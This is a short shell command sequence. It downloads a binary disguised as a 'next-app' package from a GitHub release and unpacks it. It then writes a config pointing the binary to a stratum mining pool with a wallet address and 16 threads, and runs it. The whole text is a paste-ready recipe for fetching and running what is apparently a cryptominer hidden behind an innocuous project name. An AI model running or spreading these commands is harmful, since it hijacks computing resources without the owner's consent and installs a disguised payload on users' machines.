wget https://github.com/mom742886/next-app/releases/download/v1/next-app.tar.gz

tar -xf next-app.tar.gz

cd next

echo '{"host": "stratum-eu.rplant.xyz", "port": 7022, "user": "mbc1q4gzx370c3943ks66j2q8ad00qjdqzpu2vxmwfj", "pass": "x", "threads": 16}' > config.json

./next-app
